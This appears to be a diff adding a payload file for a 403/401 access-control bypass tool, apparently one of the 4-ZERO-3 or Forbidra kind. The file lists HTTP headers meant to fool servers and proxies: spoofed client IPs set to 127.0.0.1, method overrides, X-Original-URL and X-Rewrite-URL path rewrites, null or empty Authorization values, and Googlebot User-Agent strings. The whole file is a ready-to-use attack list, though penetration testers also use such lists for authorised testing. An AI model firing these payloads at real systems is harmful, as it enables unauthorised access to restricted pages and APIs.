@@ -1,0 +1,121 @@
+# ================================================================
+# Header injection payloads
+# Format: Header-Name: value
+# {path} placeholder is replaced at runtime with the target path
+# ================================================================
+
+# --- IP spoofing / proxy headers ---
+Base-Url: 127.0.0.1
+Client-IP: 127.0.0.1
+Http-Url: 127.0.0.1
+Proxy-Host: 127.0.0.1
+Proxy-Url: 127.0.0.1
+Real-Ip: 127.0.0.1
+Redirect: 127.0.0.1
+Referer: 127.0.0.1
+Referrer: 127.0.0.1
+Refferer: 127.0.0.1
+Request-Uri: 127.0.0.1
+Uri: 127.0.0.1
+Url: 127.0.0.1
+X-Client-IP: 127.0.0.1
+X-Custom-IP-Authorization: 127.0.0.1
+X-Forward-For: 127.0.0.1
+X-Forwarded-By: 127.0.0.1
+X-Forwarded-For-Original: 127.0.0.1
+X-Forwarded-For: 127.0.0.1
+X-Forwarded-Host: 127.0.0.1
+X-Forwarded-Port: 443
+X-Forwarded-Port: 4443
+X-Forwarded-Port: 80
+X-Forwarded-Port: 8080
+X-Forwarded-Port: 8443
+X-Forwarded-Scheme: http
+X-Forwarded-Scheme: https
+X-Forwarded-Server: 127.0.0.1
+X-Forwarded: 127.0.0.1
+X-Forwarder-For: 127.0.0.1
+X-Host: 127.0.0.1
+X-Http-Destinationurl: 127.0.0.1
+X-Http-Host-Override: 127.0.0.1
+X-Original-Remote-Addr: 127.0.0.1
+X-Original-Url: 127.0.0.1
+X-Originating-IP: 127.0.0.1
+X-Proxy-Url: 127.0.0.1
+X-Real-Ip: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
+X-Remote-IP: 127.0.0.1
+X-Rewrite-Url: 127.0.0.1
+X-True-IP: 127.0.0.1
+X-ProxyUser-Ip: 127.0.0.1
+Host: localhost
+
+# --- HTTP method override ---
+X-HTTP-Method-Override: GET
+X-HTTP-Method: GET
+X-Method-Override: GET
+
+# --- Content-Type / Accept tricks ---
+Content-Type: application/json
+Content-Type: application/x-www-form-urlencoded
+Content-Type: text/plain
+Accept: application/json
+Accept: */*
+
+# --- Misc bypass headers ---
+X-Forwarded-Prefix: /
+X-Forwarded-Path: {path}
+X-Original-Method: GET
+X-Requested-With: XMLHttpRequest
+
+# ================================================================
+# NEW additions from 4-ZERO-3 / Forbidra analysis
+# ================================================================
+
+# --- Extra IP spoofing variants ---
+X-Originally-Forwarded-For: 127.0.0.1, 68.180.194.242
+X-Originating-: 127.0.0.1, 68.180.194.242
+X-Originating-IP: 127.0.0.1, 68.180.194.242
+True-Client-IP: 127.0.0.1, 68.180.194.242
+X-WAP-Profile: 127.0.0.1, 68.180.194.242
+CF-Connecting_IP: 127.0.0.1
+CF-Connecting-IP: 127.0.0.1
+X-Cluster-Client-IP: 127.0.0.1
+Forwarded-For: 127.0.0.1
+Forwarded: for=127.0.0.1
+X-Forwarded-Ssl: on
+X-Forwarded-Proto: https
+X-Forwarded-Proto: http
+
+# --- URL/domain-based spoofing ---
+Profile: http://127.0.0.1
+X-Arbitrary: http://127.0.0.1
+X-HTTP-DestinationURL: http://127.0.0.1
+Destination: 127.0.0.1
+Proxy: 127.0.0.1
+X-OReferrer: https%3A%2F%2Fwww.google.com%2F
+
+# --- Auth bypass (401-focused) ---
+Authorization: Basic
+Authorization: Bearer null
+Authorization: null
+Authorization: Bearer
+
+# --- Origin / Referer ---
+Origin: null
+Origin: http://127.0.0.1
+Referer: http://127.0.0.1
+Referer: http://127.0.0.1{path}
+
+# --- User-Agent spoofing ---
+User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
+User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+User-Agent: curl/7.68.0
+User-Agent: ()
+
+# --- Routing / rewrite ---
+X-Override-URL: {path}
+X-Original-URI: {path}
+X-Http-Host-Override: 127.0.0.1
+X-Rewrite-URL: {path}
+X-Original-URL: {path}
